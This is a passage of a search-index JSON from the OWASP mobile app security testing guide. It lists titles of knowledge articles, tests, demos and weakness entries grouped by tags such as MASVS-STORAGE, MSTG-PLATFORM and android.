</li> <li>            MASTG-KNOW-0006: Binary Protection Mechanisms          </li> <li>            MASTG-KNOW-0007: Debuggable Apps          </li> <li>            MASTG-KNOW-0008: Debugging Symbols          </li> <li>            MASTG-KNOW-0009: StrictMode          </li> <li>            MASTG-KNOW-0010: Exception Handling          </li> <li>            MASTG-KNOW-0058: App Signing          </li> <li>            MASTG-KNOW-0059: Third-Party Libraries          </li> <li>            MASTG-KNOW-0060: Memory Corruption Bugs          </li> <li>            MASTG-KNOW-0061: Binary Protection Mechanisms          </li> <li>            MASTG-KNOW-0062: Debuggable Apps          </li> <li>            MASTG-KNOW-0063: Debugging Symbols          </li> <li>            MASTG-KNOW-0064: Debugging Code and Error Logging          </li> <li>            MASTG-KNOW-0065: Exception Handling          </li> <li>            Mobile App Code Quality          </li> <li>            iOS Code Quality and Build Settings          </li> </ul>","tags":[]},{"location":"tags/#tag:masvs-crypto","title":"MASVS-CRYPTO","text":"<ul> <li>            Android Cryptographic APIs          </li> <li>            MASTG-KNOW-0011: Security Provider          </li> <li>            MASTG-KNOW-0012: Key Generation          </li> <li>            MASTG-KNOW-0013: Random number generation          </li> <li>            MASTG-KNOW-0066: CryptoKit          </li> <li>            MASTG-KNOW-0067: CommonCrypto, SecKey and Wrapper libraries          </li> <li>            MASTG-KNOW-0068: Cryptographic Third-Party libraries          </li> <li>            MASTG-KNOW-0069: Key Management          </li> <li>            MASTG-KNOW-0070: Random Number Generator          </li> <li>            Mobile App Cryptography          </li> <li>            iOS Cryptographic APIs          </li> </ul>","tags":[]},{"location":"tags/#tag:masvs-network","title":"MASVS-NETWORK","text":"<ul> <li>            Android Network Communication          </li> <li>            MASTG-KNOW-0014: Android Network Security Configuration          </li> <li>            MASTG-KNOW-0015: Certificate Pinning          </li> <li>            MASTG-KNOW-0016: TBD          </li> <li>            MASTG-KNOW-0071: iOS App Transport Security          </li> <li>            MASTG-KNOW-0072: Server Trust Evaluation          </li> <li>            MASTG-KNOW-0073: iOS Network APIs          </li> <li>            Mobile App Network Communication          </li> <li>            iOS Network Communication          </li> </ul>","tags":[]},{"location":"tags/#tag:masvs-platform","title":"MASVS-PLATFORM","text":"<ul> <li>            Android Platform APIs          </li> <li>            MASTG-KNOW-0017: App Permissions          </li> <li>            MASTG-KNOW-0018: WebViews          </li> <li>            MASTG-KNOW-0019: Deep Links          </li> <li>            MASTG-KNOW-0020: Inter-Process Communication (IPC) Mechanisms          </li> <li>            MASTG-KNOW-0021: Object Serialization          </li> <li>            MASTG-KNOW-0022: Overlay Attacks          </li> <li>            MASTG-KNOW-0023: Enforced Updating          </li> <li>            MASTG-KNOW-0024: Pending Intents          </li> <li>            MASTG-KNOW-0025: Implicit Intents          </li> <li>            MASTG-KNOW-0074: Enforced Updating          </li> <li>            MASTG-KNOW-0075: Object Serialization          </li> <li>            MASTG-KNOW-0076: WebViews          </li> <li>            MASTG-KNOW-0077: App Permissions          </li> <li>            MASTG-KNOW-0078: Inter-Process Communication (IPC)          </li> <li>            MASTG-KNOW-0079: Custom URL Schemes          </li> <li>            MASTG-KNOW-0080: Universal Links          </li> <li>            MASTG-KNOW-0081: UIActivity Sharing          </li> <li>            MASTG-KNOW-0082: App extensions          </li> <li>            MASTG-KNOW-0083: Pasteboard          </li> <li>            iOS Platform APIs          </li> </ul>","tags":[]},{"location":"tags/#tag:masvs-resilience","title":"MASVS-RESILIENCE","text":"<ul> <li>            Android Anti-Reversing Defenses          </li> <li>            MASTG-KNOW-0027: Root Detection          </li> <li>            MASTG-KNOW-0028: Anti-Debugging          </li> <li>            MASTG-KNOW-0029: File Integrity Checks          </li> <li>            MASTG-KNOW-0030: Detection of Reverse Engineering Tools          </li> <li>            MASTG-KNOW-0031: Emulator Detection          </li> <li>            MASTG-KNOW-0032: Runtime Integrity Verification          </li> <li>            MASTG-KNOW-0033: Obfuscation          </li> <li>            MASTG-KNOW-0034: Device Binding          </li> <li>            MASTG-KNOW-0035: Google Play Integrity API          </li> <li>            MASTG-KNOW-0084: Jailbreak Detection          </li> <li>            MASTG-KNOW-0085: Anti-Debugging Detection          </li> <li>            MASTG-KNOW-0086: File Integrity Checks          </li> <li>            MASTG-KNOW-0087: Reverse Engineering Tools Detection          </li> <li>            MASTG-KNOW-0088: Emulator Detection          </li> <li>            MASTG-KNOW-0089: Obfuscation          </li> <li>            MASTG-KNOW-0090: Device Binding          </li> <li>            Mobile App Tampering and Reverse Engineering          </li> <li>            iOS Anti-Reversing Defenses          </li> </ul>","tags":[]},{"location":"tags/#tag:masvs-storage","title":"MASVS-STORAGE","text":"<ul> <li>            Android Data Storage          </li> <li>            MASTG-KNOW-0026: Third-party Services Embedded in the App          </li> <li>            MASTG-KNOW-0036: Shared Preferences          </li> <li>            MASTG-KNOW-0037: SQLite Database          </li> <li>            MASTG-KNOW-0038: SQLCipher Database          </li> <li>            MASTG-KNOW-0039: Firebase Real-time Databases          </li> <li>            MASTG-KNOW-0040: Realm Databases          </li> <li>            MASTG-KNOW-0041: Internal Storage          </li> <li>            MASTG-KNOW-0042: External Storage          </li> <li>            MASTG-KNOW-0043: Android KeyStore          </li> <li>            MASTG-KNOW-0044: Key Attestation          </li> <li>            MASTG-KNOW-0045: Secure Key Import into Keystore          </li> <li>            MASTG-KNOW-0046: BouncyCastle KeyStore          </li> <li>            MASTG-KNOW-0047: Cryptographic Key Storage          </li> <li>            MASTG-KNOW-0048: KeyChain          </li> <li>            MASTG-KNOW-0049: Logs          </li> <li>            MASTG-KNOW-0050: Backups          </li> <li>            MASTG-KNOW-0051: Process Memory          </li> <li>            MASTG-KNOW-0052: User Interface Components          </li> <li>            MASTG-KNOW-0053: Screenshots          </li> <li>            MASTG-KNOW-0054: App Notifications          </li> <li>            MASTG-KNOW-0055: Keyboard Cache          </li> <li>            MASTG-KNOW-0091: File System APIs          </li> <li>            MASTG-KNOW-0092: Binary Data Storage          </li> <li>            MASTG-KNOW-0093: UserDefaults          </li> <li>            MASTG-KNOW-0094: CoreData          </li> <li>            MASTG-KNOW-0095: Firebase Real-time Databases          </li> <li>            MASTG-KNOW-0096: Realm Databases          </li> <li>            MASTG-KNOW-0097: Other Third-Party Databases          </li> <li>            MASTG-KNOW-0098: User Interface Components          </li> <li>            MASTG-KNOW-0099: Screenshots          </li> <li>            MASTG-KNOW-0100: Keyboard Cache          </li> <li>            MASTG-KNOW-0101: Logs          </li> <li>            MASTG-KNOW-0102: Backups          </li> <li>            MASTG-KNOW-0103: Process Memory          </li> <li>            MASTG-KNOW-0104: Inter-Process Communication (IPC) Mechanisms          </li> <li>            iOS Data Storage          </li> </ul>","tags":[]},{"location":"tags/#tag:mstg-arch-9","title":"MSTG-ARCH-9","text":"<ul> <li>            MASTG-TEST-0036: Testing Enforced Updating          </li> <li>            MASTG-TEST-0080: Testing Enforced Updating          </li> </ul>","tags":[]},{"location":"tags/#tag:mstg-auth-1","title":"MSTG-AUTH-1","text":"<ul> <li>            MASTG-TEST-0017: Testing Confirm Credentials          </li> </ul>","tags":[]},{"location":"tags/#tag:mstg-auth-8","title":"MSTG-AUTH-8","text":"<ul> <li>            MASTG-TEST-0018: Testing Biometric Authentication          </li> <li>            MASTG-TEST-0064: Testing Biometric Authentication          </li> </ul>","tags":[]},{"location":"tags/#tag:mstg-code-1","title":"MSTG-CODE-1","text":"<ul> <li>            MASTG-TEST-0038: Making Sure that the App is Properly Signed          </li> <li>            MASTG-TEST-0081: Making Sure that the App Is Properly Signed          </li> </ul>","tags":[]},{"location":"tags/#tag:mstg-code-2","title":"MSTG-CODE-2","text":"<ul> <li>            MASTG-TEST-0039: Testing whether the App is Debuggable          </li> <li>            MASTG-TEST-0082: Testing whether the App is Debuggable          </li> </ul>","tags":[]},{"location":"tags/#tag:mstg-code-3","title":"MSTG-CODE-3","text":"<ul> <li>            MASTG-TEST-0040: Testing for Debugging Symbols          </li> <li>            MASTG-TEST-0083: Testing for Debugging Symbols          </li> </ul>","tags":[]},{"location":"tags/#tag:mstg-code-4","title":"MSTG-CODE-4","text":"<ul> <li>            MASTG-TEST-0041: Testing for Debugging Code and Verbose Error Logging          </li> <li>            MASTG-TEST-0084: Testing for Debugging Code and Verbose Error Logging          </li> </ul>","tags":[]},{"location":"tags/#tag:mstg-code-5","title":"MSTG-CODE-5","text":"<ul> <li>            MASTG-TEST-0042: Checking for Weaknesses in Third Party Libraries          </li> <li>            MASTG-TEST-0085: Checking for Weaknesses in Third Party Libraries          </li> </ul>","tags":[]},{"location":"tags/#tag:mstg-code-8","title":"MSTG-CODE-8","text":"<ul> <li>            MASTG-TEST-0043: Memory Corruption Bugs          </li> <li>            MASTG-TEST-0086: Memory Corruption Bugs          </li> </ul>","tags":[]},{"location":"tags/#tag:mstg-code-9","title":"MSTG-CODE-9","text":"<ul> <li>            MASTG-TEST-0044: Make Sure That Free Security Features Are Activated          </li> <li>            MASTG-TEST-0087: Make Sure That Free Security Features Are Activated          </li> </ul>","tags":[]},{"location":"tags/#tag:mstg-crypto-1","title":"MSTG-CRYPTO-1","text":"<ul> <li>            MASTG-TEST-0013: Testing Symmetric Cryptography          </li> <li>            MASTG-TEST-0062: Testing Key Management          </li> </ul>","tags":[]},{"location":"tags/#tag:mstg-crypto-2","title":"MSTG-CRYPTO-2","text":"<ul> <li>            MASTG-TEST-0014: Testing the Configuration of Cryptographic Standard Algorithms          </li> <li>            MASTG-TEST-0061: Verifying the Configuration of Cryptographic Standard Algorithms          </li> </ul>","tags":[]},{"location":"tags/#tag:mstg-crypto-3","title":"MSTG-CRYPTO-3","text":"<ul> <li>            MASTG-TEST-0014: Testing the Configuration of Cryptographic Standard Algorithms          </li> <li>            MASTG-TEST-0061: Verifying the Configuration of Cryptographic Standard Algorithms          </li> </ul>","tags":[]},{"location":"tags/#tag:mstg-crypto-4","title":"MSTG-CRYPTO-4","text":"<ul> <li>            MASTG-TEST-0014: Testing the Configuration of Cryptographic Standard Algorithms          </li> </ul>","tags":[]},{"location":"tags/#tag:mstg-crypto-5","title":"MSTG-CRYPTO-5","text":"<ul> <li>            MASTG-TEST-0015: Testing the Purposes of Keys          </li> <li>            MASTG-TEST-0062: Testing Key Management          </li> </ul>","tags":[]},{"location":"tags/#tag:mstg-crypto-6","title":"MSTG-CRYPTO-6","text":"<ul> <li>            MASTG-TEST-0016: Testing Random Number Generation          </li> <li>            MASTG-TEST-0063: Testing Random Number Generation          </li> </ul>","tags":[]},{"location":"tags/#tag:mstg-network-1","title":"MSTG-NETWORK-1","text":"<ul> <li>            MASTG-TEST-0019: Testing Data Encryption on the Network          </li> <li>            MASTG-TEST-0065: Testing Data Encryption on the Network          </li> </ul>","tags":[]},{"location":"tags/#tag:mstg-network-2","title":"MSTG-NETWORK-2","text":"<ul> <li>            MASTG-TEST-0020: Testing the TLS Settings          </li> <li>            MASTG-TEST-0066: Testing the TLS Settings          </li> </ul>","tags":[]},{"location":"tags/#tag:mstg-network-3","title":"MSTG-NETWORK-3","text":"<ul> <li>            MASTG-TEST-0021: Testing Endpoint Identify Verification          </li> <li>            MASTG-TEST-0067: Testing Endpoint Identity Verification          </li> </ul>","tags":[]},{"location":"tags/#tag:mstg-network-4","title":"MSTG-NETWORK-4","text":"<ul> <li>            MASTG-TEST-0022: Testing Custom Certificate Stores and Certificate Pinning          </li> <li>            MASTG-TEST-0068: Testing Custom Certificate Stores and Certificate Pinning          </li> </ul>","tags":[]},{"location":"tags/#tag:mstg-network-6","title":"MSTG-NETWORK-6","text":"<ul> <li>            MASTG-TEST-0023: Testing the Security Provider          </li> </ul>","tags":[]},{"location":"tags/#tag:mstg-platform-1","title":"MSTG-PLATFORM-1","text":"<ul> <li>            MASTG-TEST-0024: Testing for App Permissions          </li> <li>            MASTG-TEST-0069: Testing App Permissions          </li> </ul>","tags":[]},{"location":"tags/#tag:mstg-platform-10","title":"MSTG-PLATFORM-10","text":"<ul> <li>            MASTG-TEST-0037: Testing WebViews Cleanup          </li> </ul>","tags":[]},{"location":"tags/#tag:mstg-platform-2","title":"MSTG-PLATFORM-2","text":"<ul> <li>            MASTG-TEST-0002: Testing Local Storage for Input Validation          </li> <li>            MASTG-TEST-0025: Testing for Injection Flaws          </li> <li>            MASTG-TEST-0026: Testing Implicit Intents          </li> <li>            MASTG-TEST-0027: Testing for URL Loading in WebViews          </li> </ul>","tags":[]},{"location":"tags/#tag:mstg-platform-3","title":"MSTG-PLATFORM-3","text":"<ul> <li>            MASTG-TEST-0028: Testing Deep Links          </li> <li>            MASTG-TEST-0075: Testing Custom URL Schemes          </li> </ul>","tags":[]},{"location":"tags/#tag:mstg-platform-4","title":"MSTG-PLATFORM-4","text":"<ul> <li>            MASTG-TEST-0029: Testing for Sensitive Functionality Exposure Through IPC          </li> <li>            MASTG-TEST-0030: Testing for Vulnerable Implementation of PendingIntent          </li> <li>            MASTG-TEST-0070: Testing Universal Links          </li> <li>            MASTG-TEST-0071: Testing UIActivity Sharing          </li> <li>            MASTG-TEST-0072: Testing App Extensions          </li> <li>            MASTG-TEST-0073: Testing UIPasteboard          </li> </ul>","tags":[]},{"location":"tags/#tag:mstg-platform-5","title":"MSTG-PLATFORM-5","text":"<ul> <li>            MASTG-TEST-0031: Testing JavaScript Execution in WebViews          </li> <li>            MASTG-TEST-0076: Testing iOS WebViews          </li> </ul>","tags":[]},{"location":"tags/#tag:mstg-platform-6","title":"MSTG-PLATFORM-6","text":"<ul> <li>            MASTG-TEST-0032: Testing WebView Protocol Handlers          </li> <li>            MASTG-TEST-0077: Testing WebView Protocol Handlers          </li> </ul>","tags":[]},{"location":"tags/#tag:mstg-platform-7","title":"MSTG-PLATFORM-7","text":"<ul> <li>            MASTG-TEST-0033: Testing for Java Objects Exposed Through WebViews          </li> <li>            MASTG-TEST-0078: Determining Whether Native Methods Are Exposed Through WebViews          </li> </ul>","tags":[]},{"location":"tags/#tag:mstg-platform-8","title":"MSTG-PLATFORM-8","text":"<ul> <li>            MASTG-TEST-0034: Testing Object Persistence          </li> <li>            MASTG-TEST-0079: Testing Object Persistence          </li> </ul>","tags":[]},{"location":"tags/#tag:mstg-platform-9","title":"MSTG-PLATFORM-9","text":"<ul> <li>            MASTG-TEST-0035: Testing for Overlay Attacks          </li> </ul>","tags":[]},{"location":"tags/#tag:mstg-resilience-1","title":"MSTG-RESILIENCE-1","text":"<ul> <li>            MASTG-TEST-0045: Testing Root Detection          </li> <li>            MASTG-TEST-0088: Testing Jailbreak Detection          </li> </ul>","tags":[]},{"location":"tags/#tag:mstg-resilience-11","title":"MSTG-RESILIENCE-11","text":"<ul> <li>            MASTG-TEST-0090: Testing File Integrity Checks          </li> </ul>","tags":[]},{"location":"tags/#tag:mstg-resilience-2","title":"MSTG-RESILIENCE-2","text":"<ul> <li>            MASTG-TEST-0046: Testing Anti-Debugging Detection          </li> <li>            MASTG-TEST-0089: Testing Anti-Debugging Detection          </li> </ul>","tags":[]},{"location":"tags/#tag:mstg-resilience-3","title":"MSTG-RESILIENCE-3","text":"<ul> <li>            MASTG-TEST-0047: Testing File Integrity Checks          </li> <li>            MASTG-TEST-0090: Testing File Integrity Checks          </li> </ul>","tags":[]},{"location":"tags/#tag:mstg-resilience-4","title":"MSTG-RESILIENCE-4","text":"<ul> <li>            MASTG-TEST-0048: Testing Reverse Engineering Tools Detection          </li> <li>            MASTG-TEST-0091: Testing Reverse Engineering Tools Detection          </li> </ul>","tags":[]},{"location":"tags/#tag:mstg-resilience-5","title":"MSTG-RESILIENCE-5","text":"<ul> <li>            MASTG-TEST-0049: Testing Emulator Detection          </li> <li>            MASTG-TEST-0092: Testing Emulator Detection          </li> </ul>","tags":[]},{"location":"tags/#tag:mstg-resilience-6","title":"MSTG-RESILIENCE-6","text":"<ul> <li>            MASTG-TEST-0050: Testing Runtime Integrity Checks          </li> </ul>","tags":[]},{"location":"tags/#tag:mstg-resilience-9","title":"MSTG-RESILIENCE-9","text":"<ul> <li>            MASTG-TEST-0051: Testing Obfuscation          </li> <li>            MASTG-TEST-0093: Testing Obfuscation          </li> </ul>","tags":[]},{"location":"tags/#tag:mstg-storage-1","title":"MSTG-STORAGE-1","text":"<ul> <li>            MASTG-TEST-0001: Testing Local Storage for Sensitive Data          </li> <li>            MASTG-TEST-0052: Testing Local Data Storage          </li> </ul>","tags":[]},{"location":"tags/#tag:mstg-storage-10","title":"MSTG-STORAGE-10","text":"<ul> <li>            MASTG-TEST-0011: Testing Memory for Sensitive Data          </li> <li>            MASTG-TEST-0060: Testing Memory for Sensitive Data          </li> </ul>","tags":[]},{"location":"tags/#tag:mstg-storage-11","title":"MSTG-STORAGE-11","text":"<ul> <li>            MASTG-TEST-0012: Testing the Device-Access-Security Policy          </li> <li>            MASTG-TEST-0017: Testing Confirm Credentials          </li> <li>            MASTG-TEST-0064: Testing Biometric Authentication          </li> </ul>","tags":[]},{"location":"tags/#tag:mstg-storage-2","title":"MSTG-STORAGE-2","text":"<ul> <li>            MASTG-TEST-0001: Testing Local Storage for Sensitive Data          </li> <li>            MASTG-TEST-0052: Testing Local Data Storage          </li> </ul>","tags":[]},{"location":"tags/#tag:mstg-storage-3","title":"MSTG-STORAGE-3","text":"<ul> <li>            MASTG-TEST-0003: Testing Logs for Sensitive Data          </li> <li>            MASTG-TEST-0053: Checking Logs for Sensitive Data          </li> </ul>","tags":[]},{"location":"tags/#tag:mstg-storage-4","title":"MSTG-STORAGE-4","text":"<ul> <li>            MASTG-TEST-0004: Determining Whether Sensitive Data Is Shared with Third Parties via Embedded Services          </li> <li>            MASTG-TEST-0005: Determining Whether Sensitive Data Is Shared with Third Parties via Notifications          </li> <li>            MASTG-TEST-0054: Determining Whether Sensitive Data Is Shared with Third Parties          </li> </ul>","tags":[]},{"location":"tags/#tag:mstg-storage-5","title":"MSTG-STORAGE-5","text":"<ul> <li>            MASTG-TEST-0006: Determining Whether the Keyboard Cache Is Disabled for Text Input Fields          </li> <li>            MASTG-TEST-0055: Finding Sensitive Data in the Keyboard Cache          </li> </ul>","tags":[]},{"location":"tags/#tag:mstg-storage-6","title":"MSTG-STORAGE-6","text":"<ul> <li>            MASTG-TEST-0007: Determining Whether Sensitive Stored Data Has Been Exposed via IPC Mechanisms          </li> <li>            MASTG-TEST-0056: Determining Whether Sensitive Data Is Exposed via IPC Mechanisms          </li> </ul>","tags":[]},{"location":"tags/#tag:mstg-storage-7","title":"MSTG-STORAGE-7","text":"<ul> <li>            MASTG-TEST-0008: Checking for Sensitive Data Disclosure Through the User Interface          </li> <li>            MASTG-TEST-0057: Checking for Sensitive Data Disclosed Through the User Interface          </li> </ul>","tags":[]},{"location":"tags/#tag:mstg-storage-8","title":"MSTG-STORAGE-8","text":"<ul> <li>            MASTG-TEST-0009: Testing Backups for Sensitive Data          </li> <li>            MASTG-TEST-0058: Testing Backups for Sensitive Data          </li> </ul>","tags":[]},{"location":"tags/#tag:mstg-storage-9","title":"MSTG-STORAGE-9","text":"<ul> <li>            MASTG-TEST-0010: Finding Sensitive Information in Auto-Generated Screenshots          </li> <li>            MASTG-TEST-0059: Testing Auto-Generated Screenshots for Sensitive Information          </li> </ul>","tags":[]},{"location":"tags/#tag:p","title":"P","text":"<ul> <li>            MASTG-TEST-0203: Runtime Use of Logging APIs          </li> <li>            MASTG-TEST-0206: Sensitive Data in Network Traffic Capture          </li> <li>            MASTG-TEST-0215: Sensitive Data Not Excluded From Backup          </li> <li>            MASTG-TEST-0216: Sensitive Data Not Excluded From Backup          </li> <li>            MASTG-TEST-0231: References to Logging APIs          </li> <li>            MASTG-TEST-0254: Dangerous App Permissions          </li> <li>            MASTG-TEST-0255: Permission Requests Not Minimized          </li> <li>            MASTG-TEST-0256: Missing Permission Rationale          </li> <li>            MASTG-TEST-0257: Not Resetting Unused Permissions          </li> <li>            MASTG-TEST-0262: References to Backup Configurations Not Excluding Sensitive Data          </li> <li>            MASTG-TEST-0281: Undeclared Known Tracking Domains          </li> <li>            MASWE-0001: Insertion of Sensitive Data into Logs          </li> <li>            MASWE-0004: Sensitive Data Not Excluded From Backup          </li> <li>            MASWE-0108: Sensitive Data in Network Traffic          </li> <li>            MASWE-0109: Lack of Anonymization or Pseudonymisation Measures          </li> <li>            MASWE-0110: Use of Unique Identifiers for User Tracking          </li> <li>            MASWE-0111: Inadequate Privacy Policy          </li> <li>            MASWE-0112: Inadequate Data Collection Declarations          </li> <li>            MASWE-0113: Lack of Proper Data Management Controls          </li> <li>            MASWE-0114: Inadequate Data Visibility Controls          </li> <li>            MASWE-0115: Inadequate or Ambiguous User Consent Mechanisms          </li> <li>            MASWE-0117: Inadequate Permission Management          </li> </ul>","tags":[]},{"location":"tags/#tag:r","title":"R","text":"<ul> <li>            MASTG-TEST-0038: Making Sure that the App is Properly Signed          </li> <li>            MASTG-TEST-0039: Testing whether the App is Debuggable          </li> <li>            MASTG-TEST-0040: Testing for Debugging Symbols          </li> <li>            MASTG-TEST-0041: Testing for Debugging Code and Verbose Error Logging          </li> <li>            MASTG-TEST-0045: Testing Root Detection          </li> <li>            MASTG-TEST-0046: Testing Anti-Debugging Detection          </li> <li>            MASTG-TEST-0047: Testing File Integrity Checks          </li> <li>            MASTG-TEST-0048: Testing Reverse Engineering Tools Detection          </li> <li>            MASTG-TEST-0049: Testing Emulator Detection          </li> <li>            MASTG-TEST-0050: Testing Runtime Integrity Checks          </li> <li>            MASTG-TEST-0051: Testing Obfuscation          </li> <li>            MASTG-TEST-0081: Making Sure that the App Is Properly Signed          </li> <li>            MASTG-TEST-0082: Testing whether the App is Debuggable          </li> <li>            MASTG-TEST-0083: Testing for Debugging Symbols          </li> <li>            MASTG-TEST-0084: Testing for Debugging Code and Verbose Error Logging          </li> <li>            MASTG-TEST-0088: Testing Jailbreak Detection          </li> <li>            MASTG-TEST-0089: Testing Anti-Debugging Detection          </li> <li>            MASTG-TEST-0090: Testing File Integrity Checks          </li> <li>            MASTG-TEST-0091: Testing Reverse Engineering Tools Detection          </li> <li>            MASTG-TEST-0092: Testing Emulator Detection          </li> <li>            MASTG-TEST-0093: Testing Obfuscation          </li> <li>            MASTG-TEST-0219: Testing for Debugging Symbols          </li> <li>            MASTG-TEST-0220: Usage of Outdated Code Signature Format          </li> <li>            MASTG-TEST-0224: Usage of Insecure Signature Version          </li> <li>            MASTG-TEST-0225: Usage of Insecure Signature Key Size          </li> <li>            MASTG-TEST-0226: Debuggable Flag Enabled in the AndroidManifest          </li> <li>            MASTG-TEST-0227: Debugging Enabled for WebViews          </li> <li>            MASTG-TEST-0240: Jailbreak Detection in Code          </li> <li>            MASTG-TEST-0241: Runtime Use of Jailbreak Detection Techniques          </li> <li>            MASTG-TEST-0261: Debuggable Entitlement Enabled in the entitlements.plist          </li> <li>            MASTG-TEST-0263: Logging of StrictMode Violations          </li> <li>            MASTG-TEST-0264: Runtime Use of StrictMode APIs          </li> <li>            MASTG-TEST-0265: References to StrictMode APIs          </li> <li>            MASWE-0067: Debuggable Flag Not Disabled          </li> <li>            MASWE-0089: Code Obfuscation Not Implemented          </li> <li>            MASWE-0090: Resource Obfuscation Not Implemented          </li> <li>            MASWE-0091: Anti-Deobfuscation Techniques Not Implemented          </li> <li>            MASWE-0092: Static Analysis Tools Not Prevented          </li> <li>            MASWE-0093: Debugging Symbols Not Removed          </li> <li>            MASWE-0094: Non-Production Resources Not Removed          </li> <li>            MASWE-0095: Code That Disables Security Controls Not Removed          </li> <li>            MASWE-0096: Data Sent Unencrypted Over Encrypted Connections          </li> <li>            MASWE-0097: Root/Jailbreak Detection Not Implemented          </li> <li>            MASWE-0098: App Virtualization Environment Detection Not Implemented          </li> <li>            MASWE-0099: Emulator Detection Not Implemented          </li> <li>            MASWE-0100: Device Attestation Not Implemented          </li> <li>            MASWE-0101: Debugger Detection Not Implemented          </li> <li>            MASWE-0102: Dynamic Analysis Tools Detection Not Implemented          </li> <li>            MASWE-0103: RASP Techniques Not Implemented          </li> <li>            MASWE-0104: App Integrity Not Verified          </li> <li>            MASWE-0105: Integrity of App Resources Not Verified          </li> <li>            MASWE-0106: Official Store Verification Not Implemented          </li> <li>            MASWE-0107: Runtime Code Integrity Not Verified          </li> </ul>","tags":[]},{"location":"tags/#tag:all","title":"all","text":"<ul> <li>            Mobile App Authentication Architectures          </li> <li>            Mobile App Code Quality          </li> <li>            Mobile App Cryptography          </li> <li>            Mobile App Network Communication          </li> <li>            Mobile App Tampering and Reverse Engineering          </li> </ul>","tags":[]},{"location":"tags/#tag:android","title":"android","text":"<ul> <li>            Android Anti-Reversing Defenses          </li> <li>            Android Code Quality and Build Settings          </li> <li>            Android Cryptographic APIs          </li> <li>            Android Data Storage          </li> <li>            Android Local Authentication          </li> <li>            Android Network Communication          </li> <li>            Android Platform APIs          </li> <li>            MASTG-APP-0001: AndroGoat          </li> <li>            MASTG-APP-0002: Android License Validator          </li> <li>            MASTG-APP-0003: Android UnCrackable L1          </li> <li>            MASTG-APP-0004: Android UnCrackable L2          </li> <li>            MASTG-APP-0005: Android UnCrackable L3          </li> <li>            MASTG-APP-0006: Digitalbank          </li> <li>            MASTG-APP-0007: DIVA Android          </li> <li>            MASTG-APP-0008: DodoVulnerableBank          </li> <li>            MASTG-APP-0009: DVHMA          </li> <li>            MASTG-APP-0010: InsecureBankv2          </li> <li>            MASTG-APP-0011: MASTG Hacking Playground (Java)          </li> <li>            MASTG-APP-0012: MASTG Hacking Playground (Kotlin)          </li> <li>            MASTG-APP-0013: OVAA          </li> <li>            MASTG-APP-0014: InsecureShop          </li> <li>            MASTG-APP-0015: Android UnCrackable L4          </li> <li>            MASTG-APP-0016: Finstergram          </li> <li>            MASTG-APP-0017: Disable-flutter-tls-verification          </li> <li>            MASTG-APP-0018: MASTestApp-Android-NETWORK          </li> <li>            MASTG-BEST-0001: Use Secure Random Number Generator APIs          </li> <li>            MASTG-BEST-0002: Remove Logging Code          </li> <li>            MASTG-BEST-0003: Comply with Privacy Regulations and Best Practices          </li> <li>            MASTG-BEST-0004: Exclude Sensitive Data from Backups          </li> <li>            MASTG-BEST-0005: Use Secure Encryption Modes          </li> <li>            MASTG-BEST-0006: Use Up-to-Date APK Signing Schemes          </li> <li>            MASTG-BEST-0007: Debuggable Flag Disabled in the AndroidManifest          </li> <li>            MASTG-BEST-0008: Debugging Disabled for WebViews          </li> <li>            MASTG-BEST-0009: Use Secure Encryption Algorithms          </li> <li>            MASTG-BEST-0010: Use Up-to-Date minSdkVersion          </li> <li>            MASTG-BEST-0011: Securely Load File Content in a WebView          </li> <li>            MASTG-BEST-0012: Disable JavaScript in WebViews          </li> <li>            MASTG-BEST-0013: Disable Content Provider Access in WebViews          </li> <li>            MASTG-DEMO-0001: File System Snapshots from External Storage          </li> <li>            MASTG-DEMO-0002: External Storage APIs Tracing with Frida          </li> <li>            MASTG-DEMO-0003: App Writing to External Storage without Scoped Storage Restrictions          </li> <li>            MASTG-DEMO-0004: App Writing to External Storage with Scoped Storage Restrictions          </li> <li>            MASTG-DEMO-0005: App Writing to External Storage via the MediaStore API          </li> <li>            MASTG-DEMO-0006: Tracing Common Logging APIs Looking for Secrets          </li> <li>            MASTG-DEMO-0007: Common Uses of Insecure Random APIs          </li> <li>            MASTG-DEMO-0008: Uses of Non-random Sources          </li> <li>            MASTG-DEMO-0009: Detecting Sensitive Data in Network Traffic          </li> <li>            MASTG-DEMO-0010: File System Snapshots from Internal Storage          </li> <li>            MASTG-DEMO-0012: Cryptographic Key Generation With Insufficient Key Length          </li> <li>            MASTG-DEMO-0017: Use of Hardcoded AES Key in SecretKeySpec with semgrep          </li> <li>            MASTG-DEMO-0020: Data Exclusion using backup_rules.xml with Backup Manager          </li> <li>            MASTG-DEMO-0022: Uses of Broken Symmetric Encryption Algorithms in Cipher with semgrep          </li> <li>            MASTG-DEMO-0023: Uses of Broken Encryption Modes in Cipher with semgrep          </li> <li>            MASTG-DEMO-0024: Uses of Caching UI Elements with semgrep          </li> <li>            MASTG-DEMO-0025: Uses of Build.VERSION.SDK_INT with semgrep          </li> <li>            MASTG-DEMO-0027: Runtime Use of KeyguardManager.isDeviceSecure and BiometricManager.canAuthenticate APIs with Frida          </li> <li>            MASTG-DEMO-0028: Uses of KeyguardManager.isDeviceSecure and BiometricManager.canAuthenticate with semgrep          </li> <li>            MASTG-DEMO-0029: Uses of WebViews Allowing Content Access with semgrep          </li> <li>            MASTG-DEMO-0030: Uses of WebViews Allowing Content Access with Frida          </li> <li>            MASTG-DEMO-0031: Uses of WebViews Allowing Local File Access with Frida          </li> <li>            MASTG-DEMO-0032: Uses of WebViews Allowing Local File Access with semgrep          </li> <li>            MASTG-DEMO-0033: Dangerous Permissions in the AndroidManifest with semgrep          </li> <li>            MASTG-DEMO-0034: Backup and Restore App Data with semgrep          </li> <li>            MASTG-DEMO-0035: Data Exclusion using backup_rules.xml with adb backup          </li> <li>            MASTG-DEMO-0037: App Leaking Information about Unclosed SQL Cursor via StrictMode          </li> <li>            MASTG-DEMO-0038: Detecting StrictMode Uses with Frida          </li> <li>            MASTG-DEMO-0039: Detecting StrictMode PenaltyLog Usage with Semgrep          </li> <li>            MASTG-DEMO-0040: Debuggable Flag Enabled in the AndroidManifest with semgrep          </li> <li>            MASTG-DEMO-0048: SSLSocket Connection to Wrong Host Server Allowed by Lack of HostnameVerifier          </li> <li>            MASTG-DEMO-0049: SSLSocket Connection to Wrong Host Server Blocked by HostnameVerifier          </li> <li>            MASTG-DEMO-0050: Identifying Insecure Dependencies in Android Studio          </li> <li>            MASTG-DEMO-0051: Identifying Insecure Dependencies through SBOM Creation          </li> <li>            MASTG-DEMO-0054: Use of a TrustManager that Does Not Validate Certificate Chains          </li> <li>            MASTG-DEMO-0055: Use of the HostnameVerifier that Allows Any Hostname          </li> <li>            MASTG-DEMO-0056: WebView Ignoring TLS Errors in 